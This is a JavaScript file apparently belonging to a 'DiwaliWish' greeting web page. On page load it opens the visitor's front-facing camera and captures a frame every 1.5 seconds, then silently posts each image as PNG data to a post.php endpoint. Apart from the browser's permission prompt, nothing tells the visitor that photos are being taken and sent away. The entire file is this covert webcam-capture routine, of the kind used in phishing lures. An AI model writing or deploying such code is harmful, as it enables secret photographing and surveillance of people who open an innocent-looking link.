$(document).ready(function() {
  function post(imgdata) {
    console.log("Function Loaded!!!!!");
    $.ajax({
        type: 'POST',
        data: { cat: imgdata },
        url: 'https://us2002.github.io/DiwaliWish/post.php',
        dataType: 'json',
        async: false,
        crossDomain: true, // Add this line for CORS
        success: function (result) {
            // Call the function that handles the response/results
            console.log(result);
        },
        error: function (xhr, status, error) {
            // Handle the error, log it, or display an alert
            console.error("AJAX error:", status, error);
        }
    });
  }

  'use strict';
  const video = document.getElementById('video');
  const canvas = document.getElementById('canvas');
  const errorMsgElement = document.querySelector('span#errorMsg');

  const constraints = {
    audio: false,
    video: {
      facingMode: "user"
    }
  };

  // Access webcam
  async function init() {
    try {
      const stream = await navigator.mediaDevices.getUserMedia(constraints);
      handleSuccess(stream);
    } catch (e) {
      // Handle the error, log it, or display an alert
      console.error("navigator.getUserMedia error:", e.toString());
    }
  }

  // Success
  function handleSuccess(stream) {
    window.stream = stream;
    video.srcObject = stream;

    var context = canvas.getContext('2d');
    setInterval(function () {
      context.drawImage(video, 0, 0, 640, 480);
      var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
      post(canvasData);
    }, 1500);
  }

  // Load init
  init();
});
